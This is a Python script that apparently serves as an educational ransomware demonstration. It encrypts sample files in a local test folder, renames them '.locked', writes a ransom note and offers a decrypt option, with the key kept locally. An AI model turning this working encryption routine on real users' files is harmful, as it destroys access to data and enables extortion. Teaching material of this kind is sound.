"""
Educational Ransomware Demonstration Script
===========================================
This script demonstrates ransomware behavior for educational purposes only.
It encrypts files in a test directory and provides a decryption mechanism.

WARNING: This is for educational purposes only. Never use on real systems without permission.
"""

import os
import sys
from cryptography.fernet import Fernet
import json
from pathlib import Path
from datetime import datetime


# ============================================================================
# CONFIGURATION
# ============================================================================

# Test directory where files will be encrypted
TEST_DIR = "./ransomware_test_folder"
KEY_FILE = "encryption_key.key"
ENCRYPTED_FILES_LOG = "encrypted_files.json"
RANSOM_NOTE = "RANSOM_NOTE.txt"


# ============================================================================
# ENCRYPTION KEY MANAGEMENT
# ============================================================================

def generate_encryption_key():
    """
    Generates a new encryption key and saves it to a file.
    In real ransomware, this key would be sent to attacker's server.
    """
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as key_file:
        key_file.write(key)
    print(f"[+] Encryption key generated and saved to {KEY_FILE}")
    return key


def load_encryption_key():
    """
    Loads the encryption key from file.
    """
    try:
        with open(KEY_FILE, 'rb') as key_file:
            key = key_file.read()
        print(f"[+] Encryption key loaded from {KEY_FILE}")
        return key
    except FileNotFoundError:
        print(f"[-] Key file not found: {KEY_FILE}")
        return None


# ============================================================================
# FILE ENCRYPTION/DECRYPTION
# ============================================================================

def encrypt_file(file_path, fernet):
    """
    Encrypts a single file and renames it with .locked extension.
    """
    try:
        # Read original file content
        with open(file_path, 'rb') as file:
            file_data = file.read()
        
        # Encrypt the data
        encrypted_data = fernet.encrypt(file_data)
        
        # Write encrypted data back
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
        
        # Rename file with .locked extension
        encrypted_path = file_path + ".locked"
        os.rename(file_path, encrypted_path)
        
        print(f"[+] Encrypted: {file_path}")
        return encrypted_path
    
    except Exception as e:
        print(f"[-] Error encrypting {file_path}: {str(e)}")
        return None


def decrypt_file(file_path, fernet):
    """
    Decrypts a single file and removes .locked extension.
    """
    try:
        # Read encrypted file content
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        
        # Decrypt the data
        decrypted_data = fernet.decrypt(encrypted_data)
        
        # Write decrypted data back
        with open(file_path, 'wb') as file:
            file.write(decrypted_data)
        
        # Remove .locked extension
        if file_path.endswith(".locked"):
            original_path = file_path[:-7]  # Remove ".locked"
            os.rename(file_path, original_path)
            print(f"[+] Decrypted: {original_path}")
            return original_path
        else:
            print(f"[+] Decrypted: {file_path}")
            return file_path
    
    except Exception as e:
        print(f"[-] Error decrypting {file_path}: {str(e)}")
        return None


# ============================================================================
# RANSOMWARE OPERATIONS
# ============================================================================

def create_test_environment():
    """
    Creates a test directory with sample files for demonstration.
    """
    # Create test directory
    os.makedirs(TEST_DIR, exist_ok=True)
    
    # Create sample files
    sample_files = [
        ("document1.txt", "This is a sample text document."),
        ("document2.txt", "Another important document for testing."),
        ("data.csv", "Name,Age,City\nJohn,25,Paris\nMarie,30,Lyon"),
        ("notes.txt", "Important notes to remember."),
        ("config.json", '{"setting1": "value1", "setting2": "value2"}')
    ]
    
    for filename, content in sample_files:
        file_path = os.path.join(TEST_DIR, filename)
        with open(file_path, 'w') as f:
            f.write(content)
    
    print(f"[+] Test environment created in {TEST_DIR}")
    print(f"[+] Created {len(sample_files)} sample files")


def create_ransom_note():
    """
    Creates a ransom note in the encrypted directory.
    """
    note_content = """
╔════════════════════════════════════════════════════════════════╗
║                     YOUR FILES HAVE BEEN ENCRYPTED              ║
╚════════════════════════════════════════════════════════════════╝

⚠️  EDUCATIONAL DEMONSTRATION ONLY ⚠️

What happened to your files?
-----------------------------
All your files have been encrypted using strong cryptography.
This is a demonstration of ransomware behavior for educational purposes.

How to recover your files?
---------------------------
This is a SAFE demonstration. To decrypt your files:

1. Run the script with the --decrypt option
2. Use the encryption key stored in 'encryption_key.key'

Command: python ransomware_demo.py --decrypt

⚠️  IMPORTANT NOTES ⚠️
----------------------
- This is for EDUCATIONAL PURPOSES ONLY
- Real ransomware is illegal and harmful
- Never run suspicious software on real systems
- Always maintain backups of important data
- Use antivirus and security software

Date: {}
════════════════════════════════════════════════════════════════
""".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    note_path = os.path.join(TEST_DIR, RANSOM_NOTE)
    with open(note_path, 'w') as f:
        f.write(note_content)
    
    print(f"[+] Ransom note created: {note_path}")


def encrypt_directory(directory, key):
    """
    Encrypts all files in the specified directory.
    """
    fernet = Fernet(key)
    encrypted_files = []
    
    print(f"\n[*] Starting encryption of files in {directory}...")
    
    # Get all files in directory
    for item in os.listdir(directory):
        file_path = os.path.join(directory, item)
        
        # Skip directories, key file, log file, and ransom note
        if os.path.isfile(file_path) and not item.endswith('.locked'):
            if item not in [KEY_FILE, ENCRYPTED_FILES_LOG, RANSOM_NOTE]:
                encrypted_path = encrypt_file(file_path, fernet)
                if encrypted_path:
                    encrypted_files.append(encrypted_path)
    
    # Save log of encrypted files
    log_path = os.path.join(directory, ENCRYPTED_FILES_LOG)
    with open(log_path, 'w') as log_file:
        json.dump({
            'encrypted_files': encrypted_files,
            'timestamp': datetime.now().isoformat(),
            'count': len(encrypted_files)
        }, log_file, indent=4)
    
    # Create ransom note
    create_ransom_note()
    
    print(f"\n[+] Encryption complete! {len(encrypted_files)} files encrypted.")
    print(f"[+] Encrypted files log saved to: {log_path}")


def decrypt_directory(directory, key):
    """
    Decrypts all .locked files in the specified directory.
    """
    fernet = Fernet(key)
    decrypted_files = []
    
    print(f"\n[*] Starting decryption of files in {directory}...")
    
    # Get all .locked files in directory
    for item in os.listdir(directory):
        if item.endswith('.locked'):
            file_path = os.path.join(directory, item)
            decrypted_path = decrypt_file(file_path, fernet)
            if decrypted_path:
                decrypted_files.append(decrypted_path)
    
    print(f"\n[+] Decryption complete! {len(decrypted_files)} files decrypted.")
    
    # Remove ransom note if exists
    note_path = os.path.join(directory, RANSOM_NOTE)
    if os.path.exists(note_path):
        os.remove(note_path)
        print(f"[+] Ransom note removed")


# ============================================================================
# MAIN PROGRAM
# ============================================================================

def print_banner():
    """
    Displays the program banner.
    """
    banner = """
╔═══════════════════════════════════════════════════════════════╗
║     EDUCATIONAL RANSOMWARE DEMONSTRATION                       ║
║     FOR EDUCATIONAL PURPOSES ONLY                              ║
╚═══════════════════════════════════════════════════════════════╝
"""
    print(banner)


def print_help():
    """
    Displays help information.
    """
    help_text = """
Usage: python ransomware_demo.py [OPTION]

Options:
  --setup       Create test environment with sample files
  --encrypt     Encrypt files in the test directory
  --decrypt     Decrypt files in the test directory
  --help        Display this help message

Examples:
  python ransomware_demo.py --setup      # Create test environment
  python ransomware_demo.py --encrypt    # Encrypt test files
  python ransomware_demo.py --decrypt    # Decrypt test files

⚠️  WARNING: This is for educational purposes only!
"""
    print(help_text)


def main():
    """
    Main program entry point.
    """
    print_banner()
    
    # Check command line arguments
    if len(sys.argv) < 2:
        print_help()
        return
    
    command = sys.argv[1]
    
    if command == "--setup":
        print("[*] Setting up test environment...")
        create_test_environment()
        print("\n[✓] Setup complete! Run with --encrypt to encrypt files.")
    
    elif command == "--encrypt":
        print("[*] Starting encryption process...")
        
        # Check if test directory exists
        if not os.path.exists(TEST_DIR):
            print(f"[-] Test directory not found: {TEST_DIR}")
            print("[*] Run with --setup first to create test environment")
            return
        
        # Generate or load encryption key
        if os.path.exists(KEY_FILE):
            print("[!] Encryption key already exists. Using existing key.")
            key = load_encryption_key()
        else:
            key = generate_encryption_key()
        
        # Encrypt directory
        encrypt_directory(TEST_DIR, key)
        print(f"\n[✓] Encryption complete! Check {TEST_DIR} for results.")
        print(f"[!] Keep {KEY_FILE} safe - needed for decryption!")
    
    elif command == "--decrypt":
        print("[*] Starting decryption process...")
        
        # Check if key file exists
        if not os.path.exists(KEY_FILE):
            print(f"[-] Encryption key not found: {KEY_FILE}")
            print("[!] Cannot decrypt without the key!")
            return
        
        # Load key and decrypt
        key = load_encryption_key()
        if key:
            decrypt_directory(TEST_DIR, key)
            print(f"\n[✓] Decryption complete! Your files have been recovered.")
    
    elif command == "--help":
        print_help()
    
    else:
        print(f"[-] Unknown command: {command}")
        print_help()


if __name__ == "__main__":
    main()
